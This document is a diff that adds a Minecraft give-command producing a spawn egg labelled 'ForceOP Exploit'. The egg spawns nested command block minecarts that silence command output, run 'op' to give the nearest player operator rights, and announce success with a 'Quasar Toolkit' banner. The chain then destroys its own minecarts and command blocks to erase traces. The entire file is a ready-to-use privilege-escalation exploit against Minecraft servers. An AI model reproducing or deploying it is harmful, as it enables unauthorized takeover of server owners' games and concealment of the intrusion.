@@ -1,0 +1,96 @@
+give @p 
+	ghast_spawn_egg{
+		display:{
+			Name:'{"text":"ForceOP Exploit","italic":false}'
+		},
+
+		EntityTag:{
+
+			id:spawner_minecart,
+			CustomDisplayTile:1,
+			Rotation:[0f],
+			Silent:1,
+			SpawnCount:1,
+			MinSpawnDelay:100,
+			MaxSpawnDelay:100,
+			Delay:0,
+			SpawnRange:0,
+
+			SpawnData:{
+				entity:{
+
+					id:falling_block,
+					BlockState:{Name:"redstone_block"},
+					Motion:[0.0d,0.0d,0.0d],
+					Passengers:[{
+
+						id:cow,
+						active_effects:[{id:invisibility,duration:-1,show_particles:0b}],
+						Health:0,
+						NoAI:1,
+						Passengers:[{
+
+							id:falling_block,
+							BlockState:{Name:"activator_rail"},
+							Passengers:[
+								{
+									id:command_block_minecart,
+									CustomDisplayTile:1,
+									Command:"
+										gamerule commandBlockOutput false
+									"
+								},
+								{
+									id:command_block_minecart,
+									CustomDisplayTile:1,
+									Command:"
+										execute as @e run op @p
+									"
+								},
+								{
+									id:command_block_minecart,
+									CustomDisplayTile:1,
+									Command:"
+										tellraw @p [
+											{\"text\":\"[\",\"bold\":true,\"color\":\"dark_blue\",\"clickEvent\":{\"action\":\"open_url\",\"value\":\"https://github.com/AnythingBuilder/Quasar-Toolkit\"},\"hoverEvent\":{\"action\":\"show_text\",\"contents\":\"Github\"}},
+											{\"text\":\"Quasar Toolkit\",\"bold\":true,\"color\":\"blue\"},
+											{\"text\":\"]\",\"bold\":true,\"color\":\"dark_blue\"},
+											{\"text\":\" ForceOP Sucessful. Ladies and gentlemen, we got 'em\",\"bold\":false,\"color\":\"white\"}
+										]
+									"
+								},
+								{
+									id:command_block_minecart,
+									CustomDisplayTile:1,
+									Command:"
+										playsound minecraft:entity.player.levelup master @p ~ ~ ~ 10 .5
+									"
+								},
+								{
+									id:command_block_minecart,
+									CustomDisplayTile:1,
+									Command:"
+										kill @e[type=spawner_minecart,distance=..6]
+									"
+								},
+								{
+									id:command_block_minecart,
+									CustomDisplayTile:1,
+									Command:"
+										setblock ~ ~ ~1 command_block[facing=up]{Command:\"/setblock ~ ~1 ~ command_block[facing=up]{Command:\\\"/fill ~ ~ ~ ~ ~-2 ~-1 air\\\",auto:1b} replace\",auto:1b} replace
+									"
+								},
+								{
+									id:command_block_minecart,
+									CustomDisplayTile:1,
+									Command:"
+										setblock ~ ~-1 ~1 command_block[facing=up]{Command:\"/kill @e[type=command_block_minecart,distance=..2]\",auto:1b} replace
+									"
+								}
+							]
+						}]
+					}]
+				}
+			}
+		}
+	}
